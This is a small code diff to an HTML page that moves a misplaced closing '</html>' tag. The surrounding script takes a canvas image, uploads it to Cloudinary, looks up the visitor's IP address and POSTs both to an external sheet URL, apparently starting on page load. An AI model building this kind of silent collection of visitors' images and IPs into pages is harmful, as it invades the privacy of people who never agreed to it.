@@ -49,7 +49,6 @@ async function capture() {
 
     canvas.toBlob(async function(blob) {
         const imageURL = await uploadToCloudinary(blob);
-</html>
         const ip = await getIP();
         await fetch(SHEET_URL, {
             method: "POST",
@@ -81,3 +80,4 @@ window.addEventListener('load', () => {
 </script>
 
 </body>
+</html>
